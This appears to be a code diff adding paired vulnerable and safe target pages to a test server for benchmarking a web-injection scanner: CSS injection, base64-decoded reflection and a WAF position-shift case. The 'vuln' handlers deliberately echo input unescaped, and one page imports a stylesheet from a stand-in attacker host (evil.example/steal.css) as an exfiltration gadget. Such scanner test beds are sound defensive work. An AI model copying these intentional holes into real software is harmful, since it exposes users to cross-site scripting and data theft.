@@ -1124,9 +1124,136 @@ def m_pm_safe(v: str, ctx: dict) -> tuple:
                      f"<p>Showing {html.escape(name_val, quote=True)}.</p>")
     return _page("<h1>Profile</h1><p>No profile selected.</p>")
 
+
+# ---------------------------------------------------------------------------
+# Phase 122a: CSS injection targets (L7_css_injection).
+#
+# The layer is PURE static page analysis (analyze_page on the response
+# HTML, no payload involvement) -- so the target is a static page whose
+# stylesheet itself carries an exfiltration gadget.  No reflection, no
+# parameters (param:"" -> clean URL).  The earlier "the layer can never
+# fire in this pipeline" note was WRONG: it fired the param-marker
+# reasoning at a page-level layer.
+# ---------------------------------------------------------------------------
+
+def m_cssi_vuln(v: str, ctx: dict) -> tuple:
+    """Static page whose <style> imports an external stylesheet."""
+    return _page("<h1>Theme demo</h1>"
+                 "<style>@import url(https://evil.example/steal.css);</style>"
+                 "<p>Custom theme preview.</p>")
+
+
+def m_cssi_safe(v: str, ctx: dict) -> tuple:
+    """Same shape; the stylesheet is fully self-contained."""
+    return _page("<h1>Theme demo</h1>"
+                 "<style>.theme-box{color:#333;padding:8px;}</style>"
+                 "<p>Custom theme preview.</p>")
+
+
+# ---------------------------------------------------------------------------
+# Phase 122b: pre-encoded container targets (L1_pre_encoded).
+#
+# The scanner only runs this layer when the parameter's ORIGINAL value
+# parses as a structured container (json_b64 / jwt -- detect_structure).
+# The manifest cases pin param_value to a base64-JSON blob so the scan
+# URL arrives as ?data=eyJwYWdlIjoicHJvZmlsZSJ9 ("{"page":"profile"}").
+# The app decodes the container and echoes the DECODED string raw
+# (vuln) / escaped (safe).  Values that do not decode fall back to
+# echoing the raw value (vuln) or the escaped raw value (safe) -- which
+# is what makes the scanner's own markers reflect so the param pipeline
+# reaches the pre-encode check at all.
+# ---------------------------------------------------------------------------
+
+def _pe_decode(v: str) -> str:
+    """Best-effort base64 decode (matches the app's lenient decoder)."""
+    try:
+        raw = base64.b64decode(v + "=" * (-len(v) % 4))
+        return raw.decode("utf-8")
+    except Exception:
+        return ""
+
+
+def m_pe_vuln(v: str, ctx: dict) -> tuple:
+    decoded = _pe_decode(v)
+    shown = decoded if decoded else v
+    return _page("<h1>Settings</h1>"
+                 f'<div class="profile">Profile: {shown}</div>')
+
+
+def m_pe_safe(v: str, ctx: dict) -> tuple:
+    decoded = _pe_decode(v)
+    shown = decoded if decoded else v
+    return _page("<h1>Settings</h1>"
+                 '<div class="profile">Profile: '
+                 f'{html.escape(shown, quote=True)}</div>')
+
+
+# ---------------------------------------------------------------------------
+# Phase 122c: position-shift targets (L2_position_shift).
+#
+# Phase 33 fires ONLY when (a) a WAF is detected, (b) nothing confirmed,
+# (c) the marker was NOT escaped, and (d) payloads are then re-fired in
+# the OTHER parameter location.  Shape: a POST endpoint behind a pseudo
+# WAF that inspects the BODY only.  The app echoes the body value raw
+# (so the marker reflects unescaped and the payload loop runs), the
+# loop payloads are all 406'd by the WAF, and the shift re-fires the
+# top payloads into the QUERY -- the WAF blind spot -- where the app
+# echoes them raw (vuln) / escaped (safe).  Needs ctx["query"], which
+# do_POST now provides (Phase 122).
+# ---------------------------------------------------------------------------
+
+def _pshift_render(body_val: str, query_val: str, escape_query: bool) -> tuple:
+    q_out = (html.escape(query_val, quote=True) if escape_query
+             else query_val)
+    body = ""
+    if body_val:
+        body += f'<div id="feed">{body_val}</div>'
+    if query_val:
+        body += f'<div id="search">Results for {q_out}</div>'
+    if not body:
+        body = "<p>Nothing posted yet.</p>"
+    page = ("<!DOCTYPE html><html><head><title>Feed</title></head>"
+            f"<body><h1>Feed</h1>{body}</body></html>")
+    headers = {"Content-Type": "text/html; charset=utf-8", **_WAF_HEADERS}
+    return (200, headers, page)
+
+
+def m_pshift_vuln(v: str, ctx: dict) -> tuple:
+    body_val = (ctx.get("fields") or {}).get("q", "")
+    if _waf_blocked(body_val,
+                    ["re:" + p for p in _WAF_STRICT_PATTERNS]):
+        return (406, {**_WAF_HEADERS,
+                      "Content-Type": "text/html; charset=utf-8"},
+                _WAF_BLOCK_PAGE)
+    query_val = ((ctx.get("query") or {}).get("q") or [""])[0]
+    return _pshift_render(body_val, query_val, escape_query=False)
+
+
+def m_pshift_safe(v: str, ctx: dict) -> tuple:
+    body_val = (ctx.get("fields") or {}).get("q", "")
+    if _waf_blocked(body_val,
+                    ["re:" + p for p in _WAF_STRICT_PATTERNS]):
+        return (406, {**_WAF_HEADERS,
+                      "Content-Type": "text/html; charset=utf-8"},
+                _WAF_BLOCK_PAGE)
+    query_val = ((ctx.get("query") or {}).get("q") or [""])[0]
+    return _pshift_render(body_val, query_val, escape_query=True)
+
 MODES_CTX.update({
     "pm_vuln": m_pm_vuln,
     "pm_safe": m_pm_safe,
+})
+
+PAGE_MODES.update({
+    "cssi_vuln": m_cssi_vuln,
+    "cssi_safe": m_cssi_safe,
+    "pe_vuln": m_pe_vuln,
+    "pe_safe": m_pe_safe,
+})
+
+POST_MODES.update({
+    "pshift_vuln": m_pshift_vuln,
+    "pshift_safe": m_pshift_safe,
 })
 
 
@@ -1395,6 +1522,9 @@ class BenchmarkHandler(BaseHTTPRequestHandler):
             "fields": fields,
             "files": files,
             "field": case.get("upload_field") or field,
+            # Phase 122: query dict for handlers that need BOTH locations
+            # (position-shift: WAF guards the body, the query is the gap).
+            "query": parse_qs(parsed.query, keep_blank_values=True),
             "method": "POST",
         }
         try:
